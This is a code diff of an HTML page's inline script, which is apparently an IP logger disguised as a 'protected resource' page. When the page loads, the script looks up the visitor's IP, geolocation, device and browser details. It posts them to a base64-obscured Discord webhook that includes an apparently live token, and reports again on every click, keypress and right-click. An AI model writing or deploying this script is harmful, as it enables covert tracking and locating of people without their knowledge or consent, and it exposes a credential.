@@ -94,161 +94,119 @@
     </div>
 
     <script>
-    // Base64 encoded webhook URL - decodes to your correct webhook
-    const informer = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NDE3MTg0MDMwOTQ5Nzg2Ni9uQ3RqVy1RVE5XSEZNWDIxSTNLUlozTHg1cVkxLUpZY1QxS2QyR2pfdDdXTDRlVGREajJuTEFMTk5yN285UlBWUXNn");
+    const informer = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NDE3MTg0MDMwOTQ5Nzg2Ni9uQ3RqVy1RVE5XSEZNWDIxSTNLUlozTHg1cVkxLUpZY1QxS2QyR2pfdDdXTDRlVGREajJuTEFMTk5yN285UlBWUXNn";
     
-    // Enhanced data collection with error handling
-    const collectUserData = async () => {
-        const data = {
-            timestamp: new Date().toISOString(),
-            page: window.location.href,
-            ip: "Unknown",
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            languages: navigator.languages,
-            screen: `${window.screen.width}x${window.screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cookies: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
-            location: {}
-        };
-
-        try {
-            // Try ipapi.co first
-            const ipResponse = await fetch('https://ipapi.co/json/');
-            if (ipResponse.ok) {
-                const ipData = await ipResponse.json();
-                data.ip = ipData.ip;
-                data.location = {
-                    city: ipData.city,
-                    region: ipData.region,
-                    country: ipData.country_name,
-                    org: ipData.org,
-                    postal: ipData.postal
-                };
-            } else {
-                // Fallback to ipify if ipapi fails
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                if (ipResponse.ok) {
-                    const ipData = await ipResponse.json();
-                    data.ip = ipData.ip;
-                }
-            }
-        } catch (e) {
-            console.error("IP detection failed:", e);
-        }
-
-        // Update UI
-        document.getElementById('ipDisplay').textContent = `IP: ${data.ip}`;
-        document.getElementById('userDetails').innerHTML = `
-            <strong>System Information:</strong><br>
-            • IP: ${data.ip}<br>
-            ${data.location.city ? `• Location: ${data.location.city}, ${data.location.region}, ${data.location.country}<br>` : ''}
-            ${data.location.org ? `• ISP/Org: ${data.location.org}<br>` : ''}
-            • Browser: ${data.userAgent}<br>
-            • Platform: ${data.platform}<br>
-            • Screen: ${data.screen}<br>
-            • Timezone: ${data.timezone}<br>
-            • Languages: ${data.languages.join(', ')}
-        `;
-
-        return data;
-    };
-
-    // Reliable webhook sender with retry logic
-    const sendToInformer = async (data, attempt = 1) => {
-        const maxAttempts = 3;
+    const sendToInformer = async (data) => {
+        const decodedUrl = atob(informer);
         const payload = {
             embeds: [{
-                title: "🚨 Code Access Attempt Detected",
-                description: `Protected resource accessed from:\n**IP:** ${data.ip || 'Unknown'}`,
-                color: 0xff0000,
+                title: "🚨 Code Access Alert",
+                description: `Unauthorized access detected from IP: ${data.ip || 'Unknown'}`,
+                color: 16711680, // Red
                 fields: [
                     {
                         name: "Location",
-                        value: data.location.city ? 
-                            `${data.location.city}, ${data.location.region}, ${data.location.country}` : 
-                            "Could not determine",
+                        value: data.location?.city ? 
+                            `${data.location.city}, ${data.location.region}` : 
+                            "Unknown location",
                         inline: true
                     },
                     {
-                        name: "System",
-                        value: `${data.platform} | ${data.screen}`,
+                        name: "Device",
+                        value: `${data.platform} (${data.screen})`,
                         inline: true
                     },
                     {
-                        name: "Details",
+                        name: "Full Details",
                         value: `\`\`\`json\n${JSON.stringify(data, null, 2)}\`\`\``
                     }
                 ],
-                footer: {
-                    text: data.note || "Initial access detection"
-                },
                 timestamp: new Date().toISOString()
             }]
         };
 
         try {
-            const response = await fetch(informer, {
+            const response = await fetch(decodedUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
             
-            if (!response.ok && attempt < maxAttempts) {
-                console.warn(`Attempt ${attempt} failed, retrying...`);
-                await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
-                return sendToInformer(data, attempt + 1);
+            if (!response.ok) {
+                console.error('Webhook error:', response.status, await response.text());
             }
-            
             return response.ok;
         } catch (error) {
-            console.error("Reporting error:", error);
-            if (attempt < maxAttempts) {
-                await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
-                return sendToInformer(data, attempt + 1);
-            }
+            console.error('Failed to send:', error);
             return false;
         }
     };
 
-    // Main execution flow
-    (async () => {
-        // Initial data collection and report
-        const userData = await collectUserData();
-        await sendToInformer(userData);
-        
-        // Delayed follow-up report
-        setTimeout(async () => {
-            await sendToInformer({
-                ...userData,
-                note: "User remained on page for >3 seconds"
-            });
-        }, 3000);
-
-        // Interaction monitoring
-        const reportInteraction = (type) => {
-            sendToInformer({
-                ...userData,
-                note: `User interaction: ${type}`
-            });
+    const getUserData = async () => {
+        const baseData = {
+            timestamp: new Date().toISOString(),
+            ip: "Unknown",
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            location: {}
         };
 
-        document.addEventListener('click', () => reportInteraction("click"));
-        document.addEventListener('keydown', () => reportInteraction("keypress"));
-        
-        // Security measures
-        document.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
-            reportInteraction("right-click attempt");
-        });
-
-        document.addEventListener('keydown', (e) => {
-            if (e.ctrlKey || e.metaKey) {
-                e.preventDefault();
-                reportInteraction(`keyboard shortcut: ${e.key}`);
+        try {
+            const ipResponse = await Promise.any([
+                fetch('https://api.ipify.org?format=json'),
+                fetch('https://ipapi.co/json/')
+            ]);
+            const ipData = await ipResponse.json();
+            
+            baseData.ip = ipData.ip || ipData.ip;
+            if (ipData.city) {
+                baseData.location = {
+                    city: ipData.city,
+                    region: ipData.region || ipData.region_code,
+                    country: ipData.country || ipData.country_name
+                };
             }
-        });
+        } catch (e) {
+            console.log("IP detection failed, using basic data");
+        }
+
+        return baseData;
+    };
+
+    (async () => {
+        try {
+            const userData = await getUserData();
+            
+            // Update UI
+            if (document.getElementById('ipDisplay')) {
+                document.getElementById('ipDisplay').textContent = `IP: ${userData.ip}`;
+            }
+            
+            await sendToInformer(userData);
+            
+            // Delayed report
+            setTimeout(async () => {
+                await sendToInformer({
+                    ...userData,
+                    note: "User lingered on page"
+                });
+            }, 3000);
+
+            // Interaction tracking
+            ['click', 'keydown', 'contextmenu'].forEach(event => {
+                document.addEventListener(event, () => {
+                    sendToInformer({
+                        ...userData,
+                        note: `User ${event} interaction`
+                    });
+                });
+            });
+
+        } catch (error) {
+            console.error("Initialization failed:", error);
+        }
     })();
 </script>
 </body>
